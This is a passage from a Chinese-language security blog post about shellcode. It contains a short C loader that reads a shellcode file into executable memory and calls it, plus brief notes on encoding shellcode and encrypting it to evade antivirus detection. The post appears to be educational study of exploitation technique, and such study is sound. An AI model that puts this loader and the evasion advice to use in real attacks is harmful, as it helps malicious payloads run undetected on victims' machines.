+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">int</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE fp;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>* fBuffer;</span><br><span class="line">	DWORD fsize,dwsize;</span><br><span class="line">	fp = CreateFile(<span class="string">&quot;Shellcode_bin.bin&quot;</span>,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">	fsize = GetFileSize(fp,<span class="number">0</span>);</span><br><span class="line">	fBuffer = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)VirtualAlloc(<span class="literal">NULL</span>,fsize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	ReadFile(fp,fBuffer,fsize,&amp;dwsize,<span class="number">0</span>);</span><br><span class="line">	CloseHandle(fp);</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fBuffer</span><br><span class="line">		call eax</span><br><span class="line">		popad</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello World!!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h3><p><strong>格式变化</strong></p>
+<p>在不同的样本中，由于数据处理格式不同，可能出现unescape格式、HexToAscii格式和其他语言格式</p>
+<p><strong>字符串化</strong></p>
+<p>原始Shellcode难免会有非可见字符或者休止符的出现，需对其进行字符串化变形</p>
+<p><strong>加密</strong></p>
+<p>使用加密算法来实现免杀和提高分析难度</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/06/13/Shellcode/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Shellcode-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">-Shellcode -漏洞利用</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/06/23/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            模糊测试
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/06/06/Hook%E6%8A%80%E6%9C%AF/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Hook技术</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2024
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://haoyun-forever.lofter.com/">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
